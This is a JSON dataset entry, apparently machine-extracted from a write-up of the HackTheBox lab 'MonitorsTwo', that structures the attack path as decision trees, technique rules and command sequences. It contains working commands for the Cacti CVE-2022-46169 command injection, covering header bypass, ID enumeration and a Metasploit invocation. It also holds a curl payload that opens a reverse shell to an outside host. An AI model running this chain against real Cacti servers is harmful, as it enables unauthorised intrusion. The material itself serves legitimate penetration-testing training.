@@ -1,0 +1,761 @@
+{
+  "writeup_id": "Htb_Monitorstwo",
+  "scenario_fingerprint": {
+    "scenario_name": "linux_cacti_container_escape",
+    "primary_services": [
+      "http",
+      "ssh"
+    ],
+    "port_signature": "22+80",
+    "service_combination": "ssh+nginx",
+    "os_family": "linux",
+    "environment_type": "containerized_web_application",
+    "entry_vector": "command_injection",
+    "privilege_path": "container_to_host_root",
+    "attack_complexity": "medium",
+    "estimated_time": "60-90 minutes",
+    "scenario_confidence": 0.92,
+    "distinguishing_factors": [
+      "cacti_version_1.2.22",
+      "cve_2022_46169_command_injection",
+      "docker_container_environment",
+      "database_container_pivot"
+    ],
+    "environmental_clues": [
+      "nginx_reverse_proxy",
+      "php_web_application",
+      "containerized_architecture",
+      "ubuntu_20.04_host"
+    ],
+    "similar_scenarios": [
+      "monitors_htb_hard",
+      "web_container_escapes"
+    ],
+    "unique_aspects": [
+      "docker_cve_container_escape",
+      "setuid_binary_creation",
+      "multi_container_pivot",
+      "hash_cracking_required"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "CVE-2022-46169 Command Injection",
+        "success_reason": "Cacti 1.2.22 vulnerable to unauthenticated RCE via remote_agent.php",
+        "prerequisite_indicators": [
+          "cacti_version_1.2.22_identified",
+          "remote_agent_php_accessible",
+          "valid_host_id_local_data_id_exist"
+        ],
+        "recognition_patterns": [
+          "Cacti login page with version footer",
+          "nginx serving PHP application",
+          "X-Forwarded-For header bypass works",
+          "uptime or polling_time rrd_name in responses"
+        ],
+        "failure_modes": [
+          "no_valid_host_id_found",
+          "no_uptime_polling_time_templates",
+          "authentication_bypass_patched",
+          "command_injection_filtered"
+        ],
+        "environmental_factors": [
+          "default_cacti_templates_installed",
+          "container_environment",
+          "nginx_php_fpm_stack"
+        ],
+        "success_probability": 0.85,
+        "typical_timeframe": "10-30 minutes"
+      },
+      {
+        "technique": "Manual Parameter Brute Force",
+        "success_reason": "Automated exploits failed due to incomplete search patterns",
+        "prerequisite_indicators": [
+          "automated_exploits_failing",
+          "manual_parameter_testing_needed",
+          "uptime_template_exists"
+        ],
+        "recognition_patterns": [
+          "POC scripts looking only for polling_time",
+          "Scripts missing uptime in search terms",
+          "Brute force ranges too limited"
+        ],
+        "failure_modes": [
+          "no_valid_templates_exist",
+          "parameter_ranges_exhausted",
+          "rate_limiting_triggered"
+        ],
+        "environmental_factors": [
+          "specific_cacti_template_configuration",
+          "limited_host_data_combinations",
+          "exploit_script_limitations"
+        ],
+        "success_probability": 0.75,
+        "typical_timeframe": "15-45 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "Container environment detection",
+        "discovery_method": "Shell enumeration after RCE",
+        "why_critical": "Indicates need for container escape techniques",
+        "how_to_recognize": [
+          "/.dockerenv file exists",
+          "limited process list",
+          "container-specific network config",
+          "docker cgroup entries"
+        ],
+        "follow_up_actions": [
+          "enumerate_container_capabilities",
+          "check_docker_socket_access",
+          "identify_container_escape_vectors",
+          "pivot_to_other_containers"
+        ]
+      },
+      {
+        "discovery": "Database container access",
+        "discovery_method": "Network enumeration from web container",
+        "why_critical": "Contains user credentials for host system",
+        "how_to_recognize": [
+          "mysql service on internal network",
+          "database connection configs in app",
+          "inter-container networking",
+          "credential reuse patterns"
+        ],
+        "follow_up_actions": [
+          "dump_user_hashes",
+          "crack_password_hashes",
+          "test_ssh_credential_reuse",
+          "enumerate_database_contents"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "container_www-data",
+        "escalation_method": "Database_pivot_to_host_user",
+        "why_possible": "Database contains crackable user hashes with SSH reuse",
+        "recognition_signs": [
+          "mysql_accessible_from_container",
+          "user_hashes_in_database",
+          "weak_password_policy",
+          "credential_reuse_between_services"
+        ],
+        "exploitation_path": "RCE → Container Shell → DB Access → Hash Crack → SSH User"
+      },
+      {
+        "privilege_level": "host_user",
+        "escalation_method": "Docker_CVE_container_escape",
+        "why_possible": "Docker vulnerabilities allow SetUID binary creation",
+        "recognition_signs": [
+          "docker_version_vulnerable",
+          "container_capabilities_present",
+          "host_filesystem_accessible",
+          "setuid_binary_creation_possible"
+        ],
+        "exploitation_path": "SSH User → Docker CVE → SetUID Binary → Root Shell"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found ports 22,80 open on Linux host with Cacti application",
+        "decision": "Identify Cacti version and search for known vulnerabilities",
+        "reasoning": "Cacti has history of RCE vulnerabilities, version-specific exploits available",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "directory_bruteforce",
+            "when": "if no known vulns found"
+          },
+          {
+            "option": "credential_bruteforce",
+            "when": "if login form accessible"
+          }
+        ],
+        "success_indicators": [
+          "version_identified_in_footer",
+          "cve_matches_found",
+          "exploit_code_available"
+        ],
+        "next_decision": "analyze_vulnerability_requirements"
+      },
+      {
+        "step": 2,
+        "situation": "Identified CVE-2022-46169 in Cacti 1.2.22",
+        "decision": "Test authentication bypass with X-Forwarded-For header",
+        "reasoning": "Vulnerability requires bypassing IP restriction via header manipulation",
+        "confidence": 0.85,
+        "prerequisites": [
+          "cacti_version_1.2.22",
+          "remote_agent_php_accessible"
+        ],
+        "success_indicators": [
+          "non_empty_json_response",
+          "polling_time_or_uptime_found"
+        ],
+        "failure_fallbacks": [
+          "try_different_headers",
+          "bruteforce_host_local_ids"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Authentication bypass successful, need valid host_id and local_data_ids",
+        "decision": "Bruteforce host_id and local_data_ids parameters",
+        "reasoning": "Exploit requires valid IDs to reach command injection point",
+        "confidence": 0.8,
+        "prerequisites": [
+          "x_forwarded_for_bypass_works"
+        ],
+        "success_indicators": [
+          "uptime_or_polling_time_in_response"
+        ],
+        "failure_fallbacks": [
+          "expand_bruteforce_range",
+          "try_manual_enumeration"
+        ]
+      },
+      {
+        "step": 4,
+        "situation": "Valid IDs found, ready for command injection",
+        "decision": "Inject reverse shell payload in poller_id parameter",
+        "reasoning": "poller_id parameter vulnerable to command injection after validation bypass",
+        "confidence": 0.95,
+        "prerequisites": [
+          "valid_host_id_found",
+          "valid_local_data_id_found"
+        ],
+        "success_indicators": [
+          "reverse_shell_connection",
+          "command_execution_confirmed"
+        ],
+        "failure_fallbacks": [
+          "try_different_payload_encoding",
+          "use_file_write_technique"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_cacti_identified": {
+        "action": "version_enumeration_and_vuln_research",
+        "tools": [
+          "searchsploit",
+          "github",
+          "cve_databases"
+        ],
+        "next_phase": "exploit_development"
+      },
+      "if_cve_2022_46169_applicable": {
+        "action": "test_authentication_bypass",
+        "method": "x_forwarded_for_header_manipulation",
+        "validation": "check_for_json_response"
+      },
+      "if_bypass_successful": {
+        "action": "bruteforce_required_parameters",
+        "parameters": [
+          "host_id",
+          "local_data_ids"
+        ],
+        "success_criteria": "uptime_or_polling_time_found"
+      },
+      "if_valid_ids_found": {
+        "action": "command_injection_exploitation",
+        "injection_point": "poller_id_parameter",
+        "payload_type": "reverse_shell"
+      },
+      "if_public_exploits_fail": {
+        "action": "manual_exploitation",
+        "reasoning": "public_exploits_may_have_incorrect_search_criteria",
+        "approach": "custom_parameter_bruteforce"
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_check_exploit_search_criteria",
+        "reasoning": "public_exploits_may_look_for_wrong_indicators",
+        "applicability": "when_public_exploits_fail_unexpectedly"
+      },
+      {
+        "rule": "test_authentication_bypass_first",
+        "reasoning": "saves_time_before_parameter_bruteforce",
+        "applicability": "header_based_ip_restrictions"
+      },
+      {
+        "rule": "use_proxy_for_debugging_failed_exploits",
+        "reasoning": "can_reveal_timing_or_encoding_issues",
+        "applicability": "when_exploits_work_inconsistently"
+      },
+      {
+        "rule": "expand_bruteforce_range_if_standard_fails",
+        "reasoning": "default_ranges_may_be_insufficient",
+        "applicability": "parameter_enumeration_attacks"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "Cacti Command Injection",
+        "mitre_id": "T1190",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443
+        ],
+        "os_requirements": [
+          "linux"
+        ],
+        "environmental_prerequisites": [
+          "cacti_application_detected",
+          "version_1.2.22_or_vulnerable",
+          "remote_agent_php_accessible",
+          "polling_templates_exist"
+        ],
+        "success_indicators": [
+          "uptime_or_polling_time_rrd_found",
+          "valid_host_id_discovered",
+          "valid_local_data_ids_found",
+          "x_forwarded_for_bypass_works"
+        ],
+        "incompatible_with": [
+          "authentication_required_for_remote_agent",
+          "ip_whitelist_enforced",
+          "remote_agent_disabled"
+        ],
+        "confidence_boosters": [
+          "default_cacti_installation",
+          "device_uptime_template_present",
+          "device_polling_time_template_present"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "10-30 minutes"
+      },
+      {
+        "technique": "Docker Container Escape",
+        "mitre_id": "T1611",
+        "required_services": [
+          "docker"
+        ],
+        "required_ports": [],
+        "os_requirements": [
+          "linux"
+        ],
+        "environmental_prerequisites": [
+          "docker_container_environment",
+          "vulnerable_docker_version",
+          "container_capabilities_present"
+        ],
+        "success_indicators": [
+          "proc_self_attr_exec_writable",
+          "setuid_binary_creation_possible",
+          "host_filesystem_accessible"
+        ],
+        "incompatible_with": [
+          "docker_patched_version",
+          "strict_capability_restrictions",
+          "read_only_filesystem"
+        ],
+        "confidence_boosters": [
+          "default_docker_configuration",
+          "legacy_docker_version",
+          "privileged_container"
+        ],
+        "typical_success_rate": 0.65,
+        "estimated_time": "15-45 minutes"
+      },
+      {
+        "technique": "Database Hash Cracking",
+        "mitre_id": "T1110.002",
+        "required_services": [
+          "mysql",
+          "postgresql"
+        ],
+        "required_ports": [
+          3306,
+          5432
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "database_access_obtained",
+          "user_table_accessible",
+          "weak_password_hashing"
+        ],
+        "success_indicators": [
+          "password_hashes_extracted",
+          "common_passwords_in_use",
+          "weak_hashing_algorithm"
+        ],
+        "incompatible_with": [
+          "strong_password_policy",
+          "salted_hashes",
+          "encrypted_database"
+        ],
+        "confidence_boosters": [
+          "default_user_accounts",
+          "md5_or_sha1_hashing",
+          "common_username_patterns"
+        ],
+        "typical_success_rate": 0.8,
+        "estimated_time": "5-60 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "cacti_application": {
+        "port_indicators": [
+          80,
+          443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "banner_indicators": [
+          "Login to Cacti",
+          "Cacti",
+          "nginx"
+        ],
+        "path_indicators": [
+          "/cacti",
+          "/remote_agent.php"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "docker_container": {
+        "file_indicators": [
+          "/.dockerenv",
+          "/proc/self/cgroup"
+        ],
+        "process_indicators": [
+          "docker",
+          "containerd"
+        ],
+        "filesystem_indicators": [
+          "/var/lib/docker"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "web_application": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "technology_indicators": [
+          "nginx",
+          "apache",
+          "php"
+        ],
+        "confidence_threshold": 0.9
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "cacti_command_injection",
+          "when": "cacti_application_detected",
+          "reason": "unauthenticated_rce_high_impact"
+        },
+        {
+          "attack": "database_enumeration",
+          "when": "database_service_detected",
+          "reason": "often_contains_credentials"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "docker_escape",
+          "when": "container_environment_detected",
+          "reason": "privilege_escalation_possible"
+        },
+        {
+          "attack": "ssh_bruteforce",
+          "when": "ssh_service_detected",
+          "reason": "reliable_but_noisy"
+        }
+      ],
+      "low_priority": [
+        {
+          "attack": "directory_bruteforce",
+          "when": "web_service_detected",
+          "reason": "time_consuming_low_success"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "Cacti Command Injection",
+        "mitre_id": "T1190",
+        "category": "initial_access",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "curl",
+            "command_template": "curl -H 'X-Forwarded-For: 127.0.0.1' 'http://{target}/remote_agent.php?action=polldata&local_data_ids[0]={data_id}&host_id={host_id}&poller_id={payload}'",
+            "actual_command": "curl -H 'X-Forwarded-For: 127.0.0.1' 'http://10.10.11.211/remote_agent.php?action=polldata&local_data_ids[0]=6&host_id=1&poller_id=1;id'",
+            "output_pattern": "JSON response with command output",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          },
+          {
+            "name": "wfuzz",
+            "command_template": "wfuzz -u 'http://{target}/remote_agent.php?action=polldata&local_data_ids[0]=FUZZ&host_id=1&poller_id=1' -H 'X-Forwarded-For: 127.0.0.1' -z range,1-100 --hh 2",
+            "actual_command": "wfuzz -u 'http://10.10.11.211/remote_agent.php?action=polldata&local_data_ids[0]=FUZZ&host_id=1&poller_id=1' -H 'X-Forwarded-For: 127.0.0.1' -z range,1-100 --hh 2",
+            "success_factors": [
+              "valid_data_ids_found",
+              "authentication_bypass_successful"
+            ],
+            "effectiveness_rating": 4
+          },
+          {
+            "name": "metasploit",
+            "command_template": "use exploit/linux/http/cacti_unauthenticated_cmd_injection",
+            "actual_command": "use exploit/linux/http/cacti_unauthenticated_cmd_injection; set RHOSTS 10.10.11.211; set SRVPORT 8000; run",
+            "success_factors": [
+              "proxy_required_for_reliability"
+            ],
+            "effectiveness_rating": 4
+          }
+        ],
+        "prerequisites": [
+          "cacti_version_1.2.22_accessible",
+          "remote_agent_php_endpoint_available",
+          "valid_host_id_and_local_data_ids_exist"
+        ],
+        "success_indicators": [
+          "authentication_bypass_successful",
+          "command_injection_executed",
+          "shell_obtained_in_container"
+        ],
+        "common_failures": [
+          "poc_scripts_looking_for_wrong_rrd_names",
+          "missing_x_forwarded_for_header",
+          "invalid_host_id_local_data_id_combinations"
+        ],
+        "follow_up_techniques": [
+          "container_enumeration",
+          "database_credential_extraction",
+          "docker_escape_techniques"
+        ],
+        "time_investment": "10-30 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "Parameter Brute Force",
+        "mitre_id": "T1110",
+        "category": "credential_access",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "wfuzz",
+            "command_template": "wfuzz -u 'http://{target}/remote_agent.php?action=polldata&local_data_ids[0]={data_id}&host_id=FUZZ&poller_id=1' -H 'X-Forwarded-For: 127.0.0.1' -z range,1-100 --hh 2",
+            "actual_command": "wfuzz -u 'http://10.10.11.211/remote_agent.php?action=polldata&local_data_ids[0]=1&host_id=FUZZ&poller_id=1' -H 'X-Forwarded-For: 127.0.0.1' -z range,1-100 --hh 2",
+            "output_pattern": "Non-empty JSON responses indicate valid IDs",
+            "effectiveness_rating": 5,
+            "reliability": 0.98
+          }
+        ],
+        "prerequisites": [
+          "authentication_bypass_achieved",
+          "endpoint_accessible"
+        ],
+        "success_indicators": [
+          "valid_host_id_found",
+          "valid_local_data_ids_enumerated",
+          "rrd_name_uptime_or_polling_time_discovered"
+        ],
+        "common_failures": [
+          "filtering_wrong_response_sizes",
+          "not_testing_sufficient_range"
+        ],
+        "follow_up_techniques": [
+          "command_injection_exploitation"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "beginner"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "wfuzz",
+        "use_case": "parameter_enumeration",
+        "effectiveness_rating": 5,
+        "reliability": 0.95,
+        "learning_curve": "low",
+        "essential_for": [
+          "web_application_testing"
+        ],
+        "alternatives": [
+          "burp_intruder",
+          "ffuf"
+        ],
+        "best_practices": [
+          "use_appropriate_response_filters",
+          "test_sufficient_parameter_ranges",
+          "include_necessary_headers"
+        ]
+      },
+      {
+        "tool": "metasploit",
+        "use_case": "cacti_exploitation",
+        "effectiveness_rating": 4,
+        "reliability": 0.7,
+        "learning_curve": "low",
+        "essential_for": [
+          "automated_exploitation"
+        ],
+        "alternatives": [
+          "manual_exploitation",
+          "custom_scripts"
+        ],
+        "best_practices": [
+          "use_proxy_for_reliability_issues",
+          "verify_target_compatibility",
+          "adjust_srvport_if_conflicts"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "cacti_cve_2022_46169_exploitation",
+        "steps": [
+          {
+            "step": 1,
+            "command": "wfuzz -u 'http://10.10.11.211/remote_agent.php?action=polldata&local_data_ids[0]=1&host_id=FUZZ&poller_id=1' -H 'X-Forwarded-For: 127.0.0.1' -z range,1-100 --hh 2",
+            "purpose": "Enumerate valid host_id values",
+            "expected_output": "host_id=1 returns valid data"
+          },
+          {
+            "step": 2,
+            "command": "wfuzz -u 'http://10.10.11.211/remote_agent.php?action=polldata&local_data_ids[0]=FUZZ&host_id=1&poller_id=1' -H 'X-Forwarded-For: 127.0.0.1' -z range,1-100 --hh 2",
+            "purpose": "Enumerate valid local_data_ids",
+            "expected_output": "local_data_ids 1-6 return different data"
+          },
+          {
+            "step": 3,
+            "command": "curl -H 'X-Forwarded-For: 127.0.0.1' 'http://10.10.11.211/remote_agent.php?action=polldata&local_data_ids[0]=6&host_id=1&poller_id=1;id'",
+            "purpose": "Test command injection",
+            "expected_output": "Command output in JSON response"
+          },
+          {
+            "step": 4,
+            "command": "curl -H 'X-Forwarded-For: 127.0.0.1' 'http://10.10.11.211/remote_agent.php?action=polldata&local_data_ids[0]=6&host_id=1&poller_id=1;bash+-c+\"bash+-i+>%26+/dev/tcp/10.10.14.6/4444+0>%261\"'",
+            "purpose": "Execute reverse shell payload",
+            "expected_output": "Reverse shell connection established"
+          }
+        ],
+        "success_rate": 0.9,
+        "typical_duration": "15-30 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "MonitorsTwo",
+      "difficulty": "Easy",
+      "os": "Linux (Ubuntu 20.04)",
+      "platform": "HackTheBox",
+      "release_date": "2023-04-29",
+      "author": "TheCyberGeek",
+      "estimated_time": "45-60 minutes"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "medium",
+      "skill_level_required": "beginner_to_intermediate",
+      "primary_attack_vectors": [
+        "command_injection",
+        "container_escape",
+        "docker_cve"
+      ],
+      "key_vulnerabilities": [
+        "cacti_rce",
+        "docker_privilege_escalation",
+        "container_breakout"
+      ],
+      "environment_type": "containerized_web_application",
+      "real_world_relevance": "very_high",
+      "learning_value": [
+        "container_security",
+        "docker_exploitation",
+        "web_app_rce",
+        "privilege_escalation"
+      ],
+      "prerequisite_knowledge": [
+        "basic_web_exploitation",
+        "container_concepts",
+        "linux_fundamentals"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_exploitation",
+      "subcategories": [
+        "container_escape",
+        "privilege_escalation",
+        "rce"
+      ],
+      "attack_types": [
+        "initial_access",
+        "privilege_escalation",
+        "container_breakout"
+      ],
+      "defensive_lessons": [
+        "container_hardening",
+        "patch_management",
+        "network_segmentation",
+        "privilege_separation"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Monitors",
+        "Previse",
+        "Horizontall"
+      ],
+      "similarity_reasons": [
+        "cacti_exploitation",
+        "web_rce",
+        "container_environment"
+      ],
+      "unique_aspects": [
+        "docker_cve_exploitation",
+        "container_to_host_escalation",
+        "database_container_pivot"
+      ],
+      "difficulty_factors": [
+        "manual_exploit_development",
+        "container_escape_techniques",
+        "multiple_pivot_points"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-04T16:01:38.593946",
+    "original_file": "0xdf_writeups/Htb Monitorstwo.md",
+    "content_length": 37472,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 0.9166666666666667,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 0.6666666666666666,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
